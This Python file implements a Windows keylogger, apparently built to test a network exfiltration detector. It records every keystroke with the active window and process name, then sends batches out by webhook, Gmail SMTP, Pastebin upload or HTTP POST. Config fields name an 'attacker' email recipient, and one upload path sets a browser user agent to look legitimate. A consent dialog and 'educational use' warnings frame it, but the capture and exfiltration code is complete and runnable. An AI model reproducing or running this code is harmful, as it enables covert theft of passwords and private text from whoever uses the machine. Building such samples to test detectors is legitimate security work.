# keylogger_demo/realistic_keylogger.py
"""
REALISTIC KEYLOGGER with REAL Network Exfiltration
Sends data to actual servers - WILL trigger your detector!

Options:
1. HTTP POST to webhook (easiest)
2. Email via SMTP
3. Cloud storage (Pastebin, GitHub Gist)

⚠️ EDUCATIONAL USE ONLY ⚠️
"""
import keyboard
import requests
import json
import time
import threading
import smtplib
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
from pathlib import Path
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import win32gui
import win32process
import psutil

class RealisticKeylogger:
    """
    Realistic keylogger with consent GUI and real exfiltration
    THIS WILL TRIGGER YOUR NETWORK DETECTOR!
    """
    
    def __init__(self, exfil_method='webhook', exfil_interval=10):
        """
        Args:
            exfil_method: 'webhook', 'email', or 'pastebin'
            exfil_interval: Seconds between uploads
        """
        self.buffer = []
        self.exfil_method = exfil_method
        self.exfil_interval = exfil_interval
        self.is_running = False
        self.consent_given = False
        
        # Exfiltration targets (configure these)
        self.config = {
            'webhook': 'https://webhook.site/YOUR-UNIQUE-URL',  # Get free URL from webhook.site
            'pastebin': 'https://pastebin.com/api/api_post.php',
            'email_smtp': 'smtp.gmail.com',
            'email_port': 587,
            'email_from': 'your-email@gmail.com',  # Configure this
            'email_password': 'your-app-password',   # Use app password, not real password
            'email_to': 'attacker-email@example.com'
        }
        
        self.log_dir = Path("keylogger_logs")
        self.log_dir.mkdir(exist_ok=True)
        
    def request_consent(self):
        """Show consent dialog"""
        root = tk.Tk()
        root.withdraw()
        
        consent_text = f"""
RESEARCH KEYLOGGER - CONSENT REQUIRED

This keylogger will:
1. Capture keystrokes
2. Send data to remote server every {self.exfil_interval}s
3. Method: {self.exfil_method.upper()}

⚠️ This is for research/testing ONLY
⚠️ Data will be sent over the internet

Your detector WILL catch this as suspicious network activity!

Do you consent to this data collection?
        """
        
        result = messagebox.askyesno("Research Keylogger - Consent", consent_text)
        root.destroy()
        
        self.consent_given = result
        return result
    
    def get_active_window(self):
        """Get active window info"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            return {
                'window': window_title,
                'process': process.name()
            }
        except:
            return {'window': 'Unknown', 'process': 'Unknown'}
    
    def on_key_press(self, event):
        """Capture keystroke"""
        if not self.is_running:
            return
        
        window_info = self.get_active_window()
        
        keystroke = {
            'timestamp': datetime.now().isoformat(),
            'key': event.name,
            'window': window_info['window'][:50],  # Truncate long titles
            'process': window_info['process']
        }
        
        self.buffer.append(keystroke)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Captured: {event.name}")
    
    # ============================================================
    # EXFILTRATION METHODS - THESE TRIGGER YOUR DETECTOR!
    # ============================================================
    
    def exfil_webhook(self, data):
        """
        Send to webhook.site (free testing service)
        YOUR DETECTOR WILL SEE THIS!
        """
        try:
            webhook_url = self.config['webhook']
            
            # Check if default URL
            if 'YOUR-UNIQUE-URL' in webhook_url:
                print("⚠️  Configure webhook URL first!")
                print("   1. Go to https://webhook.site")
                print("   2. Copy your unique URL")
                print("   3. Update self.config['webhook'] in code")
                return False
            
            print(f"\n📤 Sending to webhook: {webhook_url}")
            
            response = requests.post(
                webhook_url,
                json=data,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"   ✓ Sent {len(json.dumps(data))} bytes")
                print(f"   🛡️  YOUR DETECTOR ANALYZES THIS:")
                print(f"      - Destination: webhook.site (suspicious)")
                print(f"      - POST request with JSON data")
                print(f"      - Periodic pattern (every {self.exfil_interval}s)")
                return True
            else:
                print(f"   ✗ Failed: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"   ✗ Network error: {e}")
            return False
    
    def exfil_pastebin(self, data):
        """
        Upload to Pastebin (public paste service)
        YOUR DETECTOR WILL SEE THIS!
        """
        try:
            print(f"\n📤 Uploading to Pastebin...")
            
            # Pastebin allows anonymous pastes
            paste_data = {
                'api_option': 'paste',
                'api_dev_key': 'public',  # Anonymous paste
                'api_paste_code': json.dumps(data, indent=2),
                'api_paste_name': f'Keylog_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
                'api_paste_expire_date': '10M',  # Expires in 10 minutes
                'api_paste_private': '1'  # Unlisted
            }
            
            response = requests.post(
                'https://pastebin.com/api/api_post.php',
                data=paste_data,
                timeout=10
            )
            
            if 'pastebin.com' in response.text:
                print(f"   ✓ Uploaded to: {response.text}")
                print(f"   🛡️  YOUR DETECTOR SEES:")
                print(f"      - POST to pastebin.com (known paste service)")
                print(f"      - {len(json.dumps(data))} bytes uploaded")
                return True
            else:
                print(f"   ✗ Upload failed: {response.text}")
                return False
                
        except Exception as e:
            print(f"   ✗ Error: {e}")
            return False
    
    def exfil_email(self, data):
        """
        Send via email
        YOUR DETECTOR WILL SEE SMTP TRAFFIC!
        """
        try:
            # Check if configured
            if 'kmuhiire@andrew.cmu.edu' in self.config['email_from']:
                print("⚠️  Configure email settings first!")
                return False
            
            print(f"\n📤 Sending email to {self.config['email_to']}...")
            
            msg = MIMEMultipart()
            msg['From'] = self.config['email_from']
            msg['To'] = self.config['email_to']
            msg['Subject'] = f"Keylog Data - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            body = f"Keystrokes captured:\n\n{json.dumps(data, indent=2)}"
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP(self.config['email_smtp'], self.config['email_port'])
            server.starttls()
            server.login(self.config['email_from'], self.config['email_password'])
            server.send_message(msg)
            server.quit()
            
            print(f"   ✓ Email sent")
            print(f"   🛡️  YOUR DETECTOR SEES:")
            print(f"      - SMTP traffic (port 587)")
            print(f"      - Connection to {self.config['email_smtp']}")
            return True
            
        except Exception as e:
            print(f"   ✗ Email failed: {e}")
            return False
    
    def exfil_http_post(self, data):
        """
        Generic HTTP POST (simulates C2 server)
        YOUR DETECTOR WILL DEFINITELY SEE THIS!
        """
        try:
            # Use httpbin.org for testing (echoes back POST data)
            test_url = "http://httpbin.org/post"
            
            print(f"\n📤 Sending HTTP POST to {test_url}")
            
            response = requests.post(
                test_url,
                json=data,
                headers={
                    'User-Agent': 'Mozilla/5.0',  # Try to look legitimate
                    'Content-Type': 'application/json'
                },
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"   ✓ Sent {len(json.dumps(data))} bytes")
                print(f"   🛡️  YOUR DETECTOR ANALYZES THIS:")
                print(f"      - HTTP POST to httpbin.org")
                print(f"      - Small payload ({len(json.dumps(data))} bytes)")
                print(f"      - Periodic pattern (KEYLOGGER SIGNATURE!)")
                print(f"      - ML Model should classify as HIGH/CRITICAL!")
                return True
            else:
                print(f"   ✗ Failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"   ✗ Error: {e}")
            return False
    
    def exfiltrate_data(self):
        """
        Periodically exfiltrate data
        THIS IS WHAT YOUR DETECTOR CATCHES!
        """
        while self.is_running:
            time.sleep(self.exfil_interval)
            
            if self.buffer:
                # Prepare data packet
                data_packet = {
                    'timestamp': datetime.now().isoformat(),
                    'keystrokes': self.buffer[-50:],  # Last 50 keys
                    'total_count': len(self.buffer),
                    'method': self.exfil_method
                }
                
                print(f"\n{'='*60}")
                print(f"EXFILTRATION ATTEMPT #{len(self.buffer) // 50 + 1}")
                print(f"{'='*60}")
                print(f"Time: {datetime.now().strftime('%H:%M:%S')}")
                print(f"Keystrokes buffered: {len(self.buffer)}")
                print(f"Sending last 50 keystrokes...")
                
                # Choose exfiltration method
                success = False
                
                if self.exfil_method == 'webhook':
                    success = self.exfil_webhook(data_packet)
                elif self.exfil_method == 'email':
                    success = self.exfil_email(data_packet)
                elif self.exfil_method == 'pastebin':
                    success = self.exfil_pastebin(data_packet)
                elif self.exfil_method == 'http':
                    success = self.exfil_http_post(data_packet)
                
                if success:
                    print(f"\n✅ EXFILTRATION SUCCESSFUL")
                    print(f"🚨 YOUR DETECTOR SHOULD ALERT NOW!")
                else:
                    print(f"\n⚠️  Exfiltration failed (but detector still sees attempt)")
                
                print(f"{'='*60}\n")
    
    def start(self, duration=300):
        """Start keylogger"""
        if not self.consent_given:
            print("❌ Consent not given")
            return
        
        print("="*60)
        print("  REALISTIC KEYLOGGER - ACTIVE")
        print("="*60)
        print(f"\n🔴 Recording for {duration} seconds")
        print(f"📡 Exfiltration method: {self.exfil_method.upper()}")
        print(f"⏱️  Upload interval: {self.exfil_interval}s")
        print(f"💾 Local backup: {self.log_dir}")
        print("\n🛡️  YOUR DETECTOR WILL SEE:")
        print("  • Small periodic network transfers")
        print("  • Suspicious destination domains")
        print("  • High ML prediction probability")
        print("\nType to generate keystrokes...")
        print("Watch your detector for alerts!\n")
        
        self.is_running = True
        
        # Start keyboard capture
        keyboard.on_press(self.on_key_press)
        
        # Start exfiltration thread
        exfil_thread = threading.Thread(target=self.exfiltrate_data, daemon=True)
        exfil_thread.start()
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n\n⚠️  Stopped by user")
        finally:
            self.stop()
    
    def stop(self):
        """Stop keylogger"""
        self.is_running = False
        keyboard.unhook_all()
        
        print("\n" + "="*60)
        print("  KEYLOGGER STOPPED")
        print("="*60)
        print(f"\n✓ Captured {len(self.buffer)} keystrokes total")
        print(f"✓ Data sent to: {self.exfil_method}")
        print("\n🛡️  Check your detector for alerts!")
        print("="*60)

def main():
    """Run realistic keylogger"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Realistic Keylogger with Real Exfiltration")
    parser.add_argument('--method', choices=['webhook', 'email', 'pastebin', 'http'],
                       default='http',
                       help='Exfiltration method (default: http)')
    parser.add_argument('--interval', type=int, default=15,
                       help='Upload interval in seconds (default: 15)')
    parser.add_argument('--duration', type=int, default=300,
                       help='Duration in seconds (default: 300)')
    
    args = parser.parse_args()
    
    print("="*60)
    print("  REALISTIC KEYLOGGER DEMO")
    print("="*60)
    print("\n⚠️  This sends REAL network traffic!")
    print("Your detector WILL catch this.\n")
    
    # Create keylogger
    logger = RealisticKeylogger(
        exfil_method=args.method,
        exfil_interval=args.interval
    )
    
    # Request consent
    if not logger.request_consent():
        print("❌ Consent denied. Exiting.")
        return
    
    # Run
    logger.start(duration=args.duration)

if __name__ == "__main__":
    main()